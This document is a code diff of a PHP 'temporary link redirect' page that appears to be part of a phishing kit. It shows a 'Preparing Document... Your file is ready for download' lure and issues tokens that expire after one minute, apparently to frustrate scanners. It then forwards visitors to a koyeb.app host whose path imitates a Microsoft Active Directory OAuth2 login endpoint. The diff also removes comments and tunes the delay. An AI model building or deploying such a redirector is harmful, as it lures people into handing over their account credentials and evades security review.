@@ -3,20 +3,17 @@
 // SECURE 1-MINUTE TEMPORARY LINK REDIRECT
 // ==============================================
 
-// Enable error reporting for debugging (disable in production)
 error_reporting(0);
 ini_set('display_errors', 0);
 
 // ================= CONFIGURATION =================
 $config = [
-    // Redirect target link
-    'redirect_link' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',  // The URL to redirect to
-    'expire_seconds' => 60,  // Expiration in seconds
-    'redirect_delay' => 1    // 1-second redirect delay
+    'redirect_link' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',
+    'expire_seconds' => 60,
+    'redirect_delay' => 5
 ];
 
 // ================= SECURITY CHECKS =================
-// Block direct access to this file if not via web request
 if (php_sapi_name() === 'cli') {
     die("This script can only be accessed via web browser");
 }
@@ -31,17 +28,14 @@ function isTokenValid($token) {
     return (count($parts) === 2 && (time() - (int)$parts[1]) <= 60);
 }
 
-// ================= REQUEST HANDLING =================
 try {
-    // Handle redirect request
     if (isset($_GET['token'])) {
         $token = $_GET['token'];
-        
+
         if (!isTokenValid($token)) {
             throw new Exception("This link has expired after 1 minute");
         }
 
-        // Log successful access
         file_put_contents('access.log', sprintf(
             "%s|ACCESSED|%s|%s\n",
             date('Y-m-d H:i:s'),
@@ -49,19 +43,15 @@ try {
             $token
         ), FILE_APPEND);
 
-        // Perform redirect
         header("Location: {$config['redirect_link']}");
         exit;
     }
 
-    // ================= NEW REQUEST =================
-    // Generate new token
     $token = generateToken();
-    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . 
+    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') .
                   $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
     $redirectUrl = $current_url . '?token=' . urlencode($token);
 
-    // Log generation
     file_put_contents('access.log', sprintf(
         "%s|GENERATED|%s|%s\n",
         date('Y-m-d H:i:s'),
@@ -70,7 +60,6 @@ try {
     ), FILE_APPEND);
 
 } catch (Exception $e) {
-    // Error handling
     error_log("Redirect Error: " . $e->getMessage());
     http_response_code(500);
     header('Content-Type: text/html; charset=utf-8');
@@ -81,15 +70,14 @@ try {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
+            font-family: Arial, sans-serif;
             background: #f0f0f0;
+            height: 100vh;
+            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -100,93 +88,61 @@ try {
             width: 100%;
             background-color: #333;
             color: white;
-            padding: 10px 0;
+            padding: 10px;
             text-align: center;
             font-weight: bold;
-            opacity: 0;
-            animation: fadeIn 1s ease-in-out forwards;
         }
         .message-box {
-            position: relative;
             background: #fff;
-            padding: 20px;
+            padding: 20px 30px;
             box-shadow: 0 0 15px #0078d7;
-            border-radius: 5px;
+            border-radius: 8px;
             text-align: center;
             max-width: 400px;
-            opacity: 0;
-            animation: fadeIn 1s ease-in-out forwards;
+            opacity: 1;
+            animation: fadeIn 1s ease-in;
         }
         .footer {
             font-size: 0.8rem;
             color: #888;
         }
-
-        /* Fade animation */
         @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        /* Fade out animation */
-        @keyframes fadeOut {
-            0% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-
-        .fade-out {
-            animation: fadeOut 1s ease-in-out forwards;
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div class="top-bar" id="top-bar">Preparing Document...</div>
-    <div class="message-box" id="message-box">
-        <h2 id="message">Hang tight! You will be redirected soon.</h2>
-        <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
-        <p class="footer">If not, <a href="https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/">click here</a>.</p>
-    </div>
-    <script>
-    let countdown = 2;
-    let topBar = document.getElementById('top-bar');
-    let messageBox = document.getElementById('message-box');
-    let message = document.getElementById('message');
 
-    // Stage 1: Preparing Document
-    setTimeout(() => {
-        topBar.textContent = 'Preparing Document...';
-        topBar.style.opacity = 1;
-    }, 0);
+<div class="top-bar" id="top-bar">Preparing Document...</div>
 
-    // Stage 2: File Ready
-    setTimeout(() => {
-        topBar.classList.add('fade-out');
-        message.textContent = 'Your file is ready for download!';
-        messageBox.style.opacity = 1;
-    }, 800); // faster transition
+<div class="message-box" id="message-box">
+    <h2 id="message">Hang tight! You will be redirected soon.</h2>
+    <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
+    <p class="footer">If not, <a href="<?php echo htmlspecialchars($config['redirect_link']); ?>">click here</a>.</p>
+</div>
 
-    // Stage 3: Redirecting in Progress
-    setTimeout(() => {
-        messageBox.classList.add('fade-out');
-        topBar.textContent = 'Redirecting in Progress...';
-        topBar.style.opacity = 1;
-        message.textContent = 'You will be redirected shortly.';
-        messageBox.style.opacity = 1;
-    }, 1400); // earlier than 3000ms
+<script>
+    let countdown = 5;
+    const countdownEl = document.getElementById('countdown');
+    const message = document.getElementById('message');
+    const topBar = document.getElementById('top-bar');
 
-    // Countdown Timer
-    setInterval(() => {
-        document.getElementById('countdown').textContent = countdown;
-        if (countdown > 0) countdown--;
+    const interval = setInterval(() => {
+        countdown--;
+        if (countdownEl) countdownEl.textContent = countdown;
+        if (countdown <= 0) clearInterval(interval);
     }, 1000);
 
-    // 🚀 Automatic Redirect after 2.5 seconds
+    setTimeout(() => {
+        topBar.textContent = "Redirecting in Progress...";
+        message.textContent = "Please wait while we redirect you...";
+    }, 2500);
+
     setTimeout(() => {
         window.location.href = "<?php echo htmlspecialchars($redirectUrl); ?>";
-    }, 2500);
+    }, 5000);
 </script>
-
 
 </body>
 </html>
-
